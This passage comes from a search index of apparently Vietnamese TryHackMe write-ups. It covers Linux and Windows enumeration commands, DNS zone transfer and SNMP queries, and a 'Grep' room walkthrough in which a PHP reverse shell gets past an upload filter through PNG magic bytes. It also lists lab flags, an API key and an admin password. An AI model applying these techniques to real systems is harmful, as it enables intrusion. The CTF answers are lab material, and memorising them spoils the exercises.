primary Linux and MS Windows commands that we relied on to get more information about the system. Linux Command Description hostname shows the system\u2019s hostname who shows who is logged in whoami shows the effective username w shows who is logged in and what they are doing last shows a listing of the last logged-in users ip address show shows the network interfaces and addresses arp shows the ARP cache netstat prints network connections ps shows a snapshot of the current processes Windows Command Description systeminfo shows OS configuration information, including service pack levels whoami shows the user name and group information along with the respective security identifiers netstat shows protocol statistics and current TCP/IP network connections net user shows the user accounts on the computer net localgroup shows the local groups on the computer arp shows the IP-to-Physical address translation tables","title":"Enumeration"},{"location":"tryhackme/room/enumeration/#enumeration","text":"","title":"Enumeration"},{"location":"tryhackme/room/enumeration/#task-1-introduction","text":"This room is organized as follows: Purpose of enumeration Linux enumeration with commonly-installed tools: System, users, networking, and running services MS Windows enumeration with built-in tools: System, users, networking, and running services Examples of additional tools: Seatbelt\\","title":"Task 1: Introduction"},{"location":"tryhackme/room/enumeration/#answer-the-questions-bellow","text":"What command would you use to start the PowerShell interactive command line? powershell.exe","title":"Answer the questions bellow"},{"location":"tryhackme/room/enumeration/#task-2-purpose","text":"Focus: Users and groups Hostnames Routing tables Network shares Network services Applications and banners Firewall configurations Service settings and audit configurations SNMP and DNS details Hunting for credentials (saved on web browsers or client applications) etc...","title":"Task 2: Purpose"},{"location":"tryhackme/room/enumeration/#answer-the-questions-bellow_1","text":"In SSH key-based authentication, which key does the client need private key","title":"Answer the questions bellow"},{"location":"tryhackme/room/enumeration/#task-3-linux-enumeration","text":"M\u1ed9t v\u00e0i ti\u1ebfp c\u1eadn ban \u0111\u1ea7u:","title":"Task 3: Linux Enumeration"},{"location":"tryhackme/room/enumeration/#system","text":"ls /etc/*-release : T\u00ecm ki\u1ebfm c\u00e1c t\u1ec7p tin k\u1ebft th\u00fac b\u1eb1ng -release v\u00e0 n\u1eb1m trong folder etc hostname : T\u00ecm t\u00ean h\u1ec7 th\u1ed1ng. /usr/bin/ , /sbin/ : N\u01a1i ch\u1ee9a c\u00e1c \u1ee9ng d\u1ee5ng \u0111\u00e3 c\u00e0i \u0111\u1eb7t. dpkg -l : L\u1ea5y danh s\u00e1ch c\u00e1c package \u0111\u00e3 c\u00e0i (Linux Debian) rpm -qa : L\u1ea5y danh s\u00e1ch c\u00e1c package \u0111\u00e3 c\u00e0i (Linux RPM)","title":"System"},{"location":"tryhackme/room/enumeration/#users","text":"who : Xem th\u00f4ng tin nh\u1eefng user \u0111\u00e3 login w : Xem th\u00f4ng tin nh\u1eefng user \u0111\u00e3 login v\u00e0 \u0111ang l\u00e0m g\u00ec last : Xem g\u1ea7n \u0111\u00e2y ai \u0111\u00e3 s\u1eed d\u1ee5ng h\u1ec7 th\u1ed1ng sudo -l : Li\u1ec7t k\u00ea l\u1ec7nh \u0111\u01b0\u1ee3c ph\u00e9p cho ng\u01b0\u1eddi d\u00f9ng g\u1ecdi tr\u00ean h\u1ec7 th\u1ed1ng","title":"Users"},{"location":"tryhackme/room/enumeration/#networking","text":"ip address show = ip a s = ifconfig -a : Hi\u1ec3n th\u1ecb ip cat /etc/resolv.conf : Xem m\u00e1y ch\u1ee7 DNS netstat : L\u1ec7nh d\u00f9ng \u0111\u1ec3 t\u00ecm hi\u1ec3u v\u1ec1 k\u1ebft n\u1ed1i m\u1ea1ng Options Description -a show both listening and non-listening sockets -l show only listening sockets -n show numeric output instead of resolving the IP address and port number -t TCP -u UDP -x UNIX -n Show the PID and name of the program to which the socket belongs Terminal user @TryHackMe $ sudo netstat -plt Active Internet connections ( only servers ) Proto Recv-Q Send-Q Local Address Foreign Address State PID / Program name tcp 0 0 0 . 0 . 0 . 0 : ssh 0 . 0 . 0 . 0 :* LISTEN 978 / sshd tcp 0 0 localhost : smtp 0 . 0 . 0 . 0 :* LISTEN 1141 / master tcp6 0 0 [::]: ssh [::]:* LISTEN 978 / sshd tcp6 0 0 localhost : smtp [::]:* LISTEN 1141 / master netstat -atupn : Hi\u1ec3n th\u1ecb t\u1ea5t c\u1ea3 k\u1ebft n\u1ed1i \u0111\u00e3 thi\u1ebft l\u1eadp TCP, UDP (\u0111\u01b0a ra \u0111\u1ecbnh d\u1ea1ng s\u1ed1) Terminal user @TryHackMe $ sudo netstat -atupn Active Internet connections ( servers and established ) Proto Recv-Q Send-Q Local Address Foreign Address State PID / Program name tcp 0 0 0 . 0 . 0 . 0 : 22 0 . 0 . 0 . 0 :* LISTEN 978 / sshd tcp 0 0 127 . 0 . 0 . 1 : 25 0 . 0 . 0 . 0 :* LISTEN 1141 / master tcp 0 0 10 . 20 . 30 . 129 : 22 10 . 20 . 30 . 113 : 38822 ESTABLISHED 5665 / sshd : peter [ p tcp 0 0 10 . 20 . 30 . 129 : 22 10 . 20 . 30 . 105 : 38826 ESTABLISHED 5723 / sshd : jane [ pr tcp6 0 0 ::: 22 :::* LISTEN 978 / sshd tcp6 0 0 :: 1 : 25 :::* LISTEN 1141 / master udp 0 0 127 . 0 . 0 . 1 : 323 0 . 0 . 0 . 0 :* 640 / chronyd udp 0 0 0 . 0 . 0 . 0 : 68 0 . 0 . 0 . 0 :* 5638 / dhclient udp6 0 0 :: 1 : 323 :::* 640 / chronyd lsof Terminal user @TryHackMe $ sudo lsof -i COMMAND PID USER FD TYPE DEVICE SIZE / OFF NODE NAME chronyd 640 chrony 5u IPv4 16945 0t0 UDP localhost : 323 chronyd 640 chrony 6u IPv6 16946 0t0 UDP localhost : 323 sshd 978 root 3u IPv4 20035 0t0 TCP *: ssh ( LISTEN ) sshd 978 root 4u IPv6 20058 0t0 TCP *: ssh ( LISTEN ) master 1141 root 13u IPv4 20665 0t0 TCP localhost : smtp ( LISTEN ) master 1141 root 14u IPv6 20666 0t0 TCP localhost : smtp ( LISTEN ) dhclient 5638 root 6u IPv4 47458 0t0 UDP *: bootpc sshd 5693 peter 3u IPv4 47594 0t0 TCP rpm-red-enum . thm : ssh -> 10 . 20 . 30 . 113 : 38822 ( ESTABLISHED ) [...] lsof -i :25 : Gi\u1edbi h\u1ea1n \u0111\u1ea7u ra nh\u1eefng th\u1ee9 \u1edf port 25 (nh\u01b0 smtp)","title":"Networking"},{"location":"tryhackme/room/enumeration/#running-services","text":"ps : Xem c\u00e1c ti\u1ebfn tr\u00ecnh \u0111ang ch\u1ea1y Options Description -e all processes -f full-format listing -j jobs format -l long format -u user-oriented format ps aux = ps -ef : Xem \u0111\u1ea7y \u0111\u1ee7 ti\u1ebfn tr\u00ecnh ps axjf : Hi\u1ec3n th\u1ecb c\u00e2y ti\u1ebfn tr\u00ecnh ps -ef | grep ABC : l\u1ea5y ra c\u00e1c ti\u1ebfn tr\u00ecnh c\u00f3 ABC","title":"Running Services"},{"location":"tryhackme/room/enumeration/#answer-the-questions-bellow_2","text":"What is the name of the Linux distribution used in the VM? Ans: Ubuntu What is its version number? Ans: 20.04.4 What is the name of the user who last logged in to the system? Ans: randa What is the highest listening TCP port number? Ans: 6667 G\u1ee3i \u00fd Xem hi\u1ec3n th\u1ecb t\u1ea1i Terminal user @red -linux-enumeration :~$ netstat -atupn | grep \"tcp\" ( Not all processes could be identified , non-owned process info will not be shown , you would have to be root to see it all .) tcp 0 0 0 . 0 . 0 . 0 : 389 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 1 : 6667 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 10 . 10 . 223 . 177 : 53 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 1 : 53 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 53 : 53 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 0 . 0 . 0 . 0 : 22 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 1 : 953 0 . 0 . 0 . 0 :* LISTEN - tcp 0 308 10 . 10 . 223 . 177 : 22 10 . 18 . 80 . 57 : 56546 ESTABLISHED - tcp6 0 0 ::: 389 :::* LISTEN - tcp6 0 0 fe80 :: 5 : 4ff : fe24 : 277 : 53 :::* LISTEN - tcp6 0 0 :: 1 : 53 :::* LISTEN - tcp6 0 0 ::: 21 :::* LISTEN - tcp6 0 0 ::: 22 :::* LISTEN - tcp6 0 0 :: 1 : 953 :::* LISTEN - What is the program name of the service listening on it? Ans: inspircd G\u1ee3i \u00fd C\u00f3 hai c\u00e1ch d\u00f9ng nh\u01b0ng \u0111\u1ec1u d\u00f9ng sudo m\u1edbi c\u00f3 th\u1ec3 hi\u1ec3n th\u1ecb \u0111\u01b0\u1ee3c NAME: D\u00f9ng sudo lsof -i :6667 Terminal user @red -linux-enumeration :~$ sudo lsof -i : 6667 COMMAND PID USER FD TYPE DEVICE SIZE / OFF NODE NAME inspircd 718 irc 4u IPv4 27760 0t0 TCP localhost : ircd ( LISTEN ) D\u00f9ng sudo netstat -atupn There is a script running in the background. Its name starts with THM. What is the name of the script? Ans: THM-24765.sh G\u1ee3i \u00fd Terminal user @red -linux-enumeration :~$ ps aux | grep \"THM\" randa 642 0 . 0 0 . 0 2608 592 ? Ss 13 : 54 0 : 00 / bin / sh -c / home / randa / THM - 24765 . sh randa 645 0 . 0 0 . 2 6892 2236 ? S 13 : 54 0 : 00 / bin / bash / home / randa / THM - 24765 . sh user 2530 0 . 0 0 . 0 6432 720 pts / 0 S + 15 : 08 0 : 00 grep - -color = auto THM","title":"Answer the questions bellow"},{"location":"tryhackme/room/enumeration/#task-4-windows-enumeration","text":"Alt text","title":"Task 4: Windows Enumeration"},{"location":"tryhackme/room/enumeration/#system_1","text":"systeminfo : Xem th\u00f4ng tin chi ti\u1ebft c\u1ee7a h\u1ec7 th\u1ed1ng Example CMD PS C :\\ Users \\ user > systeminfo Host Name : RED-WIN-ENUM OS Name : Microsoft Windows Server 2019 Datacenter OS Version : 10 . 0 . 17763 N / A Build 17763 OS Manufacturer : Microsoft Corporation OS Configuration : Standalone Server OS Build Type : Multiprocessor Free Registered Owner : EC2 Registered Organization : Amazon . com Product ID : 00430 - 00000 - 00000-AA155 Original Install Date : 3 / 17 / 2021 , 2 : 59 : 06 PM System Boot Time : 8 / 22 / 2023 , 3 : 41 : 32 PM System Manufacturer : Amazon EC2 System Model : t3a . small System Type : x64-based PC Processor ( s ): 1 Processor ( s ) Installed . [ 01 ]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~ 2200 Mhz BIOS Version : Amazon EC2 1 . 0 , 10 / 16 / 2017 Windows Directory : C :\\ Windows System Directory : C :\\ Windows \\ system32 Boot Device : \\ Device \\ HarddiskVolume1 System Locale : en-us ; English ( United States ) Input Locale : en-us ; English ( United States ) Time Zone : ( UTC ) Coordinated Universal Time Total Physical Memory : 2 , 016 MB Available Physical Memory : 1 , 042 MB Virtual Memory : Max Size : 2 , 400 MB Virtual Memory : Available : 1 , 458 MB Virtual Memory : In Use : 942 MB Page File Location ( s ): C :\\ pagefile . sys Domain : WORKGROUP Logon Server : N / A Hotfix ( s ): 30 Hotfix ( s ) Installed . [ 01 ]: KB5015731 [ 02 ]: KB4470502 [ 03 ]: KB4470788 [ 04 ]: KB4480056 [ 05 ]: KB4486153 [ 06 ]: KB4493510 [ 07 ]: KB4499728 [ 08 ]: KB4504369 [ 09 ]: KB4512577 [ 10 ]: KB4512937 [ 11 ]: KB4521862 [ 12 ]: KB4523204 [ 13 ]: KB4535680 [ 14 ]: KB4539571 [ 15 ]: KB4549947 [ 16 ]: KB4558997 [ 17 ]: KB4562562 [ 18 ]: KB4566424 [ 19 ]: KB4570332 [ 20 ]: KB4577586 [ 21 ]: KB4577667 [ 22 ]: KB4587735 [ 23 ]: KB4589208 [ 24 ]: KB4598480 [ 25 ]: KB4601393 [ 26 ]: KB5000859 [ 27 ]: KB5015811 [ 28 ]: KB5012675 [ 29 ]: KB5014031 [ 30 ]: KB5014797 Network Card ( s ): 1 NIC ( s ) Installed . [ 01 ]: Amazon Elastic Network Adapter Connection Name : Ethernet 3 DHCP Enabled : Yes DHCP Server : 10 . 10 . 0 . 1 IP address ( es ) [ 01 ]: 10 . 10 . 185 . 186 [ 02 ]: fe80 :: f552 : b4b7 : 83c3 : ccef Hyper-V Requirements : A hypervisor has been detected . Features required for Hyper-V will not be displayed . wmic qfe get Caption,Description : Ki\u1ec3m tra c\u00e1c b\u1ea3n c\u1eadp nh\u1eadp \u0111\u00e3 c\u00e0i \u0111\u1eb7t Example CMD C :\\> wmic qfe get Caption , Description Caption Description http :// support . microsoft . com / ? kbid = 5013630 Update https :// support . microsoft . com / help / 5013944 Security Update Update net start : Xem c\u00e1c t\u1ec7p window \u0111\u00e3 \u0111\u01b0\u1ee3c c\u00e0i \u0111\u1eb7t v\u00e0 kh\u1edfi \u0111\u1ed9ng Example CMD C :\\> net start These Windows services are started : Base Filtering Engine Certificate Propagation Client License Service ( ClipSVC ) COM + Event System Connected User Experiences and Telemetry CoreMessaging Cryptographic Services DCOM Server Process Launcher DHCP Client DNS Client [...] Windows Time Windows Update WinHTTP Web Proxy Auto-Discovery Service Workstation The command completed successfully . wmic product get name,version,vendor : Xem c\u00e1c \u1ee9ng d\u1ee5ng \u0111\u00e3 c\u00e0i \u0111\u1eb7t Example CMD C :\\> wmic product get name , version , vendor Name Vendor Version Microsoft Visual C ++ 2019 X64 Minimum Runtime - 14 . 28 . 29910 Microsoft Corporation 14 . 28 . 29910 [...] Microsoft Visual C ++ 2019 X64 Additional Runtime - 14 . 28 . 29910 Microsoft Corporation 14 . 28 . 29910","title":"System"},{"location":"tryhackme/room/enumeration/#users_1","text":"whoami : Xem b\u1ea1n l\u00e0 ai whoami /priv : Xem nh\u1eefng quy\u1ec1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng Example CMD C :\\> whoami win-server-cli \\ strategos > whoami / priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled [...] whoami /groups : Ki\u1ec3m tra xem b\u1ea1n thu\u1ed9c nh\u00f3m n\u00e0o net user : Xem nh\u1eefng ng\u01b0\u1eddi d\u00f9ng Example CMD C :\\> net user User accounts for \\\\ WIN-SERVER-CLI ------------------------------------------------------------------------------- Administrator DefaultAccount Guest michael peter strategos WDAGUtilityAccount The command completed successfully . net group , net localgroup : Xem c\u00e1c nh\u00f3m Example CMD C :\\> net localgroup Aliases for \\\\ WIN-SERVER-CLI ------------------------------------------------------------------------------- * Access Control Assistance Operators * Administrators * Backup Operators * Certificate Service DCOM Access * Cryptographic Operators * Device Owners [...] net localgroup administrators : Xem ng\u01b0\u1eddi d\u00f9ng admin c\u1ee5c b\u1ed9 Example CND C :\\> net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer / domain Members ------------------------------------------------------------------------------- Administrator michael peter strategos The command completed successfully . net accounts , net accounts /domain : Xem account/ acount trong AD Xem th\u00eam t\u1ea1i Hacking with powershell","title":"Users"},{"location":"tryhackme/room/enumeration/#networking_1","text":"ipconfig /all : Xem \u0111\u1ecba ch\u1ec9 ip netstat -abno : -a: Hi\u1ec3n th\u1ecb t\u1ea5t c\u1ea3 th\u00f4ng tin v\u1ec1 c\u00e1c port \u0111ang listen/connect -b: T\u00ecm t\u1ec7p nh\u1ecb ph\u00e2n li\u00ean quan \u0111\u1ebfn k\u1ebft n\u1ed1i -n: output number -o: Hi\u1ec3n th\u1ecb ID process (PID) arp -a : Xem b\u1ea3ng ARP","title":"Networking"},{"location":"tryhackme/room/enumeration/#answer-the-questions-bellow_3","text":"What is the full OS Name? Ans: Microsoft Windows Server 2019 Datacenter Tip Xem example \u1edf ph\u1ea7n System What is the OS Version? Ans: 10.0.17763 Tip Xem example \u1edf ph\u1ea7n System How many hotfixes are installed on this MS Windows Server? Ans: 30 Tip Xem example \u1edf ph\u1ea7n System What is the lowest TCP port number listening on the system? Ans: 22 Tip D\u00f9ng netstat CMD PS C :\\ Users \\ user > netstat Active Connections Proto Local Address Foreign Address State TCP 10 . 10 . 185 . 186 : 22 ip - 10 - 18 - 80 - 57 : 58676 ESTABLISHED TCP 10 . 10 . 185 . 186 : 49771 20 . 12 . 23 . 50 : https SYN_SENT What is the name of the program listening on that port? Ans: sshd.exe Tip D\u00f9ng netstat -abno Alt text","title":"Answer the questions bellow"},{"location":"tryhackme/room/enumeration/#task-5-dns-smb-and-snmp","text":"","title":"Task 5: DNS, SMB, and SNMP"},{"location":"tryhackme/room/enumeration/#dns","text":"","title":"DNS"},{"location":"tryhackme/room/enumeration/#smb","text":"net share : Ki\u1ec3m tra c\u00e1c th\u01b0 m\u1ee5c \u0111\u01b0\u1ee3c chia s\u1ebb Example CMD user @TryHackMe $ net share Share name Resource Remark ------------------------------------------------------------------------------- C $ C :\\ Default share IPC $ Remote IPC ADMIN $ C :\\ Windows Remote Admin Internal C :\\ Internal Files Internal Documents Users C :\\ Users The command completed successfully .","title":"SMB"},{"location":"tryhackme/room/enumeration/#snmp","text":"","title":"SNMP"},{"location":"tryhackme/room/enumeration/#answer-the-questions-bellow_4","text":"Knowing that the domain name on the MS Windows Server of IP 10.10.138.215 is redteam.thm, use dig to carry out a domain transfer. What is the flag that you get in the records? Ans: THM{DNS_ZONE} Tip B\u00e0i n\u00e0y kh\u00f3 1 c\u00e1i l\u00e0 ssh v\u00e0o ngay powershell nh\u01b0ng powershell th\u00ec l\u1ea1i kh\u00f4ng c\u00f3 dig \u0111\u1ec3 ta xem record. Ta s\u1ebd l\u1ee3i d\u1ee5ng nslookup nh\u01b0 terminal b\u00ean d\u01b0\u1edbi CMD PS C :\\ Users \\ user > nslookup 10 . 10 . 138 . 215 Server : ip - 10 - 0 - 0 - 2 . eu-west - 1 . compute . internal Address : 10 . 0 . 0 . 2 Name : ip - 10 - 10 - 138 - 215 . eu-west - 1 . compute . internal Address : 10 . 10 . 138 . 215 PS C :\\ Users \\ user > nslookup Default Server : ip - 10 - 0 - 0 - 2 . eu-west - 1 . compute . internal Address : 10 . 0 . 0 . 2 > server 10 . 10 . 138 . 215 Default Server : ip - 10 - 10 - 138 - 215 . eu-west - 1 . compute . internal Address : 10 . 10 . 138 . 215 > ls -d redteam . thm [ ip - 10 - 10 - 138 - 215 . eu-west - 1 . compute . internal ] redteam . thm . SOA red-win-enum hostmaster . ( 5 900 600 86400 3600 ) redteam . thm . NS red-win-enum first A 10 . 10 . 254 . 1 flag TXT \"THM{DNS_ZONE}\" second A 10 . 10 . 254 . 2 tryhackme CNAME tryhackme . com redteam . thm . SOA red-win-enum hostmaster . ( 5 900 600 86400 3600 ) > What is the name of the share available over SMB protocol and starts with THM? Ans: THM{829738} Tip CMD PS C :\\ Users \\ user > net share Share name Resource Remark ------------------------------------------------------------------------------- C $ C :\\ Default share IPC $ Remote IPC ADMIN $ C :\\ Windows Remote Admin Internal C :\\ Internal Files Internal Documents THM { 829738 } C :\\ Users \\ user \\ Private Enjoy SMB shares Users C :\\ Users The command completed successfully . Knowing that the community string used by the SNMP service is public, use snmpcheck to collect information about the MS Windows Server of IP 10.10.138.215. What is the location specified? Ans: THM{SNMP_SERVICE} Tip Ch\u1ea1y /opt/snmpcheck/snmpcheck.rb 10.10.138.215 -c public | more tr\u00ean m\u00e1y attackbox.","title":"Answer the questions bellow"},{"location":"tryhackme/room/enumeration/#task-6-more-tools-for-windows","text":"","title":"Task 6: More Tools for Windows"},{"location":"tryhackme/room/enumeration/#sysinternals-suite","text":"Xem t\u1ea1i https://docs.microsoft.com/en-us/sysinternals/downloads/ Utility Name Description Process Explorer Shows the processes along with the open files and registry keys Process Monitor Monitor the file system, processes, and Registry PsList Provides information about processes PsLoggedOn Shows the logged-in users","title":"Sysinternals Suite"},{"location":"tryhackme/room/enumeration/#process-hacker","text":"Xem t\u1ea1i https://processhacker.sourceforge.io/","title":"Process Hacker"},{"location":"tryhackme/room/enumeration/#ghostpack-seatbelt","text":"Xem t\u1ea1i https://github.com/GhostPack/Seatbelt","title":"GhostPack Seatbelt"},{"location":"tryhackme/room/enumeration/#answer-the-questions-bellow_5","text":"What utility from Sysinternals Suite shows the logged-in users? Ans: PsLoggedOn","title":"Answer the questions bellow"},{"location":"tryhackme/room/enumeration/#task-7-conclusion","text":"The focus of this room was on built-in command-line tools in both Linux and MS Windows systems. Many commands exist in both systems, although the command arguments and resulting output are different. The following tables show the primary Linux and MS Windows commands that we relied on to get more information about the system. Linux Command Description hostname shows the system\u2019s hostname who shows who is logged in whoami shows the effective username w shows who is logged in and what they are doing last shows a listing of the last logged-in users ip address show shows the network interfaces and addresses arp shows the ARP cache netstat prints network connections ps shows a snapshot of the current processes Windows Command Description systeminfo shows OS configuration information, including service pack levels whoami shows the user name and group information along with the respective security identifiers netstat shows protocol statistics and current TCP/IP network connections net user shows the user accounts on the computer net localgroup shows the local groups on the computer arp shows the IP-to-Physical address translation tables","title":"Task 7: Conclusion"},{"location":"tryhackme/room/greprtp/","tags":["THM-Room","Privilege Escalation"],"text":"Grep \u00b6 Room at https://tryhackme.com/room/greprtp List of the questions solved Question: What is the API key that allows a user to register on the website? Ans: ffe60ecaa8bba2f12b43d1a4b15b8f39 Question: What is the first flag? Ans: THM{4ec9806d7e1350270dc402ba870ccebb} Question: What is the email of the \"admin\" user? Ans: admin@searchme2023cms.grep.thm Question: What is the host name of the web application that allows a user to check an email for a possible password leak? Ans: leakchecker.grep.thm Question: What is the password of the \"admin\" user? Ans: admin_tryhackme! Pentest scenario \u00b6 Host: 10.10.216.13 B\u00e0i n\u00e0y ch\u1ee7 y\u1ebfu gi\u00fap ta r\u00e8n luy\u1ec7n k\u0129 n\u0103ng recon v\u00e0 OSINT th\u00f4i. Reconnaissance \u00b6 \u0110\u1ea7u ti\u00ean ta c\u0169ng s\u1ebd scan nmap v\u00e0 gobuster challenge Nmap PORT STATE SERVICE VERSION 22 / tcp open ssh OpenSSH 8 . 2p1 Ubuntu 4ubuntu0 . 3 ( Ubuntu Linux ; protocol 2 . 0 ) | ssh-hostkey : | 3072 012933a4d287d46ae7cc0618ebcb5365 ( RSA ) | 256 c3a547c2e12301020bb94fbab810cc11 ( ECDSA ) | _ 256 f59cf1339f9f6749c0b80cf4e36e1424 ( ED25519 ) 80 / tcp open http Apache httpd 2 . 4 . 41 (( Ubuntu )) | _http-server-header : Apache / 2 . 4 . 41 ( Ubuntu ) | _http-title : Apache2 Ubuntu Default Page : It works 443 / tcp open ssl / http Apache httpd 2 . 4 . 41 | ssl-cert : Subject : commonName = grep . thm / organizationName = SearchME / stateOrProvinceName = Some-State / countryName = US | Not valid before : 2023 - 06 - 14T13 : 03 : 09 | _Not valid after : 2024 - 06 - 13T13 : 03 : 09 | _http-server-header : Apache / 2 . 4 . 41 ( Ubuntu ) | _ssl-date : TLS randomness does not represent time | tls-alpn : | _ http / 1 . 1 | _http-title : 400 Bad Request C\u00e1i kh\u00f3 ch\u1ed7 n\u00e0y l\u00e0 trang c\u00f3 port 443 cho service https. V\u00e0 \u0111\u00e3 \u0111\u01b0\u1ee3c sign n\u00ean ta s\u1ebd kh\u00f4ng scan dir \u0111\u01b0\u1ee3c. Ta ph\u1ea3i config hostname v\u00e0o file /etc/hosts /etc/hosts 10 . 10 . 216 . 13 grep . thm \u0110\u1ec3 \u00fd \u0111o\u1ea1n scan nmap c\u00f3 d\u00f2ng ...commonName=grep.thm... n\u00ean s\u1ebd config theo t\u00ean n\u00e0y. Ti\u1ebfp theo, scan gobuster, d\u00f9ng c\u00e1c k\u0129 thu\u1eadt th\u0103m d\u00f2 nh\u01b0 F12,... ta s\u1ebd \u0111\u01b0\u1ee3c th\u1ee9 trong h\u00ecnh b\u00ean d\u01b0\u1edbi Ta nh\u1eadn \u0111\u01b0\u1ee3c API-KEY nh\u01b0ng submit l\u1ea1i b\u1ecb l\u1ed7i (register c\u0169ng b\u1ecb l\u1ed7i th\u00f4ng b\u00e1o key h\u1ebft h\u1ea1n ho\u1eb7c sai key). Hashid cho ta bi\u1ebft key d\u00f9ng MD5. Sau khi decrypt ta \u0111\u01b0\u1ee3c johncena . Search gg c\u00e1c ki\u1ec3u ch\u1ea3 ra g\u00ec Nh\u1eadn th\u1ea5y r\u1eb1ng trang web c\u00f3 SearchMe. Ta ti\u1ebfp t\u1ee5c t\u00ecm ki\u1ebfm b\u1eb1ng github th\u00ec ra \u0111\u01b0\u1ee3c repo b\u00ean d\u01b0\u1edbi Sau m\u1ed9t v\u00e0i thao t\u00e1c \u0111i\u1ec1u tra, ta \u0111\u00e3 l\u1ea5y \u0111\u01b0\u1ee3c API-Key Ti\u1ebfn h\u00e0nh register account v\u00e0 login \u0111\u1ec3 nh\u1eadn first flag. Ti\u1ebfp t\u1ee5c t\u1edbi trang upload Nh\u1eadn th\u1ea5y r\u1eb1ng trang upload h\u1ecd filter b\u1eb1ng $allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp']; Nh\u01b0ng v\u1ea5n \u0111\u1ec1 \u1edf \u0111\u00e2y l\u00e0 filter v\u1ec1 m\u1eb7t m\u00e3 hex c\u1ee7a file (ch\u1ee9 kh\u00f4ng ph\u1ea3i filter theo d\u1ea1ng l\u1ea5y extension ra so s\u00e1nh). Ta s\u1ebd t\u1ea1o reverse shell v\u1edbi t\u00ean file l\u00e0 script.php nh\u01b0ng thay \u0111\u1ed5i th\u00f4ng s\u1ed1 magic number 89 50 4E 47 0D 0A 1A 0A Xem link https://en.wikipedia.org/wiki/List_of_file_signatures ho\u1eb7c xem h\u00ecnh b\u00ean d\u01b0\u1edbi Magic number for png file V\u00e0 ta th\u00e0nh th\u00f4ng trong vi\u1ec7c th\u00e2m nh\u1eadp h\u1ec7 th\u1ed1ng Init Access \u00b6 Ti\u1ebfp t\u1ee5c OSINT, ta \u0111\u01b0\u1ee3c th\u00f4ng tin account admin trong folder backup D\u00f9ng john \u0111\u1ec3 gi\u1ea3i m\u00e3 password m\u00e3i th\u00ec kh\u00f4ng \u0111\u01b0\u1ee3c. Xem x\u00e9t ti\u1ebfp ta th\u1ea5y trong h\u1ec7 th\u1ed1ng t\u1ed3n t\u1ea1i m\u1ed9t folder leakchecker \u0111\u00e3 sign - th\u00ec \u0111\u00e2y l\u00e0 1 subdomain c\u1ee7a grep.thm Ti\u1ebfp t\u1ee5c \u0111em n\u00f3 v\u00e0o file /etc/hosts Ta \u0111\u01b0\u1ee3c password c\u1ee7a user admin Th\u1ef1c ra th\u00ec ban \u0111\u1ea7u b\u01b0\u1edbc scan nmap v\u1eabn c\u00f2n 1 port \u1ea9n l\u00e0 51337 d\u00e0nh cho subdomain n\u00e0y. T\u00f4i c\u00f3 t\u00ecnh kh\u00f4ng \u0111\u1ec3 \u1edf ph\u1ea7n scan tr\u01b0\u1edbc \u0111\u1ec3 nh\u1eb1m hidden n\u00f3, \u0111\u1ebfn l\u00fac n\u00e0y m\u1edbi \u0111em ra :3 51337 / tcp open http Apache httpd 2 . 4 . 41 | _http-server-header : Apache / 2 . 4 . 41 ( Ubuntu ) | _http-title : 400 Bad Request H\u01a1n th\u1ebf n\u1eefa, b\u1ea3n ch\u1ea5t \u0111\u00e2y l\u00e0 port cho http c\u00f3 h\u1ed7 tr\u1ee3 ssl. Nh\u01b0ng ta s\u1ebd nh\u1eadn \u0111\u01b0\u1ee3c th\u00f4ng b\u00e1o Your browser sent a request that this server could not understand. Reason: You're speaking plain HTTP to an SSL-enabled server port. Instead use the HTTPS scheme to access this URL, please. n\u1ebfu truy c\u1eadp b\u1eb1ng http v\u00ec \u0111\u1ec3 truy c\u1eadp http c\u00f3 h\u1ed7 tr\u1ee3 ssl nh\u01b0 n\u00e0y, ta ph\u1ea3i d\u00f9ng https thay th\u1ebf. What we learned \u00b6 Config DNS Server through hosts file Config DNS Server through hosts file :3 Bypass file extensions by using magic numbers","title":"Grep"},{"location":"tryhackme/room/greprtp/#grep","text":"Room at https://tryhackme.com/room/greprtp List of the questions solved Question: What is the API key that allows a user to register on the website? Ans: ffe60ecaa8bba2f12b43d1a4b15b8f39 Question: What is the first flag? Ans: THM{4ec9806d7e1350270dc402ba870ccebb} Question: What is the email of the \"admin\" user? Ans: admin@searchme2023cms.grep.thm Question: What is the host name of the web application that allows a user to check an email for a possible password leak? Ans: leakchecker.grep.thm Question: What is the password of the \"admin\" user? Ans: admin_tryhackme!","title":"Grep"},{"location":"tryhackme/room/greprtp/#pentest-scenario","text":"Host: 10.10.216.13 B\u00e0i n\u00e0y ch\u1ee7 y\u1ebfu gi\u00fap ta r\u00e8n luy\u1ec7n k\u0129 n\u0103ng recon v\u00e0 OSINT th\u00f4i.","title":"Pentest scenario"},{"location":"tryhackme/room/greprtp/#reconnaissance","text":"\u0110\u1ea7u ti\u00ean ta c\u0169ng s\u1ebd scan nmap v\u00e0 gobuster challenge Nmap PORT STATE SERVICE VERSION 22 / tcp open ssh OpenSSH 8 . 2p1 Ubuntu 4ubuntu0 . 3 ( Ubuntu Linux ; protocol 2 . 0 ) | ssh-hostkey : | 3072 012933a4d287d46ae7cc0618ebcb5365 ( RSA ) | 256 c3a547c2e12301020bb94fbab810cc11 ( ECDSA ) | _ 256 f59cf1339f9f6749c0b80cf4e36e1424 ( ED25519 ) 80 / tcp open http Apache httpd 2 . 4 . 41 (( Ubuntu )) | _http-server-header : Apache / 2 . 4 . 41 ( Ubuntu ) | _http-title : Apache2 Ubuntu Default Page : It works 443 / tcp open ssl / http Apache httpd 2 . 4 . 41 | ssl-cert : Subject : commonName = grep . thm / organizationName = SearchME / stateOrProvinceName = Some-State / countryName = US | Not valid before : 2023 - 06 - 14T13 : 03 : 09 | _Not valid after : 2024 - 06 - 13T13 : 03 : 09 | _http-server-header : Apache / 2 . 4 . 41 ( Ubuntu ) | _ssl-date 